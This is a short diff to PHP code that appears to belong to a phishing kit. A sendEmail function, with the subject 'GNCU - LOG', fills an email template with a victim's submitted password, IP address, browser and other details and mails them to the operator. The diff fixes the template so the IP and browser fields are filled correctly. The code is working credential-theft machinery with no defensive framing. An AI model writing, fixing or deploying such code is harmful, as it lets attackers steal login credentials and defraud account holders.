@@ -92,7 +92,7 @@ function sendEmail($prevValues, $subject = "GNCU - LOG") {
                 
                 <div class='flex'>
                     <p class='title'>Ip Address:</p>
-                    <p class='content'>{{browser}}</p>
+                    <p class='content'>{{ip}}</p>
                 </div>
     
                 <div class='flex'>
@@ -109,7 +109,7 @@ function sendEmail($prevValues, $subject = "GNCU - LOG") {
     $message = str_replace("{{password}}", $values["password"], $message);
     $message = str_replace("{{ip}}", $values["ip"], $message);
     $message = str_replace("{{detail}}", $values["detail"], $message);
-    $message = str_replace("{{detail}}", $values["detail"], $message);
+    $message = str_replace("{{browser}}", $values["browser"], $message);
     $ip = $values["ip"];
 
     return mail($EMAIL, "$subject | $ip", $message, $headers, "-f$SENDER_EMAIL");
